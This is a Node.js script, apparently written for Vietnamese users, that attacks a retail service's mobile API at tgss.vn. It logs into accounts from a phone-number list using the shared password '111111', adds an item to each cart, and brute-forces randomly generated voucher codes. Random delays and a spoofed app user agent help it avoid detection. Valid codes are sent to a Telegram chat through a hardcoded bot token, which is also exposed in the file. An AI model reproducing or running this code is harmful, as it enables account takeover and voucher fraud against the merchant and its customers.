const axios = require('axios');
const fs = require('fs');
const keep_alive = require('./keep_alive.js');
const TelegramBot = require('node-telegram-bot-api');
const token = '6528272977:AAEAhdYKPy-4YINgIFgjVWcit7V0jxwmPgc';
const telegramBot = new TelegramBot(token);
const chatId = '1958068409';

async function sendTelegramMessage(message) {
    try {
        await telegramBot.sendMessage(chatId, message);
    } catch (error) {
        console.error("Lỗi gửi tin nhắn đến Telegram:", error);
    }
}

async function delay(minSeconds, maxSeconds) {
    const randomDelay = Math.floor(Math.random() * (maxSeconds - minSeconds + 1) * 1000) + (minSeconds * 1000);
    await new Promise(resolve => setTimeout(resolve, randomDelay));
    return randomDelay / 1000;
}

async function login(phone, retries = 3) {
    if (retries < 0) {
        return null;
    }
    if (retries < 3) {
        await delay(2, 10);
    }
    try {
        let password = "111111";
        const data = {
            userName: phone,
            password: password
        };
        const headers = {
            "User-Agent": "Dart/2.18 (dart:io)",
            "Content-Type": "application/json",
            "Content-Length": "45",
            "Accept-Encoding": "gzip",
            "Host": "backend2.tgss.vn"
        };
        const response = await axios.post('https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/customers/login', data, {headers: headers});
        const token = response.data.data.token;
        return token;

    } catch (error) {
        const message = `Đăng nhập không thành công:${phone}-${error.message}`;
        console.error(message);
        return await login(phone, retries - 1)
    }

}

async function verifyToken(phone, token, retries = 2) {
    if (retries < 0) {
        return null;
    }
    if (retries < 2) {
        await delay(2, 5);
    }
    try {
        const data = {
            token: token
        };
        const headers = {
            "User-Agent": "Dart/2.18 (dart:io)",
            "Content-Type": "application/json",
            "Content-Length": "956",
            "Accept-Encoding": "gzip",
            "Host": "backendecom.tgss.vn"
        };
        const response = await axios.post('https://backendecom.tgss.vn/api/mobile/v1/authentication/verify-token', data, {headers: headers});
        const tokenVerify = response.data.result.token;
        return tokenVerify;
    } catch (error) {
        const message = `Verify Token không thành công:${phone}-${error.message}`;
        console.error(message);
        return await verifyToken(phone, token, retries - 1)
    }


}

async function addCart(phone, tokenVerify, retries = 2) {
    if (retries < 0) {
        return null;
    }
    if (retries < 2) {
        await delay(2, 5);
    }
    try {
        const data = {
            "merchantId": 42457,
            "productId": 48846,
            "quantity": 1
        };
        const headers = {
            "User-Agent": "Dart/2.18 (dart:io)",
            "Content-Type": "application/json",
            "Content-Length": "51",
            "Accept-Encoding": "gzip",
            "authorization": `Bearer ${tokenVerify}`
        };
        const response = await axios.post('https://backendecom.tgss.vn/api/mobile/v1/cart/add?returnHttpStatus=true', data, {headers: headers});
        const messageCode = response.data.messageCode;
        return messageCode;
    } catch (error) {
        const message = `Thêm sản phẩm vào giỏ hàng không thành công :${phone}-${error.message}`;
        console.error(message);
        return await addCart(phone, tokenVerify, retries - 1)
    }


}

async function vouchersApply(tokenVerify, retries = 4, headGift = 15, code) {
    if (retries < 0) {
        return null;
    }

    const data = {
        "merchantId": 42457,
        "voucherCode": `DT${headGift}${code}`,
        "deliveryDate": "2024-07-31 11:15:00"
    };

    const headers = {
        "User-Agent": "Dart/2.18 (dart:io)",
        "Content-Type": "application/json",
        "Content-Length": "86",
        "Accept-Encoding": "gzip",
        "Host": "backendecom.tgss.vn",
        "authorization": `Bearer ${tokenVerify}`
    };

    try {
        console.log(`DT${headGift}${code}`);
        const response = await axios.post('https://backendecom.tgss.vn/api/mobile/v1/vouchers/apply', data, { headers });
        console.log(response.data)
        const status = response.data.messageCode;
        if (status === 200) {
            return {
                voucherCode: response.data.result.voucherCode,
                value: response.data.result.textDenominationValue
            };
        } else {
            await delay(5, 15);
            return await vouchersApply(tokenVerify, retries - 1, headGift + 1, code);
        }
    } catch (error) {
        console.error('Error applying voucher:', error);
        return null;
    }
}

async function randomCode() {
    const digits = '0123456789';
    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const numDigits = Math.floor(Math.random() * 5) + 1;
    const numLetters = 8 - numDigits;
    let result = '';
    for (let i = 0; i < numDigits; i++) {
        result += digits.charAt(Math.floor(Math.random() * digits.length));
    }
    for (let i = 0; i < numLetters; i++) {
        result += letters.charAt(Math.floor(Math.random() * letters.length));
    }
    result = result.split('').sort(() => Math.random() - 0.5).join('');
    return result;
}


async function readTokensFromFile(filename) {
    return new Promise((resolve, reject) => {
        fs.readFile(filename, 'utf8', (err, data) => {
            if (err) {
                return reject(err);
            }
            const tokens = data.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            resolve(tokens);
        });
    });
}
async function processPhoneNumber(phone) {
    try {
        const loginToken = await login(phone);
        if (!loginToken) {
            throw new Error(`Failed to login:${phone}`);
        }
        console.log(`${phone}:${loginToken}`)
        const verifyTokenValue = await verifyToken(phone, loginToken);
        if (!verifyTokenValue) {
            throw new Error('Failed to verify token');
        }

        const addCartStatus = await addCart(phone, verifyTokenValue);
        if (addCartStatus !== 200) {
            throw new Error('Failed to add to cart');
        }

        let voucherResult = null;
        await delay(90, 120);
        while (!voucherResult) {
            const voucherCode = await randomCode();
            voucherResult = await vouchersApply(verifyTokenValue, 4, 15, voucherCode);
            if (!voucherResult) {
                console.log(`Retrying voucher application for phone: ${phone}`);
                await delay(60, 90);
            }
        }
        const message=`Voucher: ${voucherResult.voucherCode}, value: ${voucherResult.value}`;
        await sendTelegramMessage(message);
    } catch (error) {
        console.error(`Error processing phone ${phone}:`, error.message);
    }
}
async function checkVoucher(){
    try {
        const listPhone = await readTokensFromFile('data.txt');
        await Promise.all(listPhone.map(phone => processPhoneNumber(`0${phone}`)));
    } catch (error) {
        console.error('Error reading phone numbers from file:', error.message);
    }

}
checkVoucher();
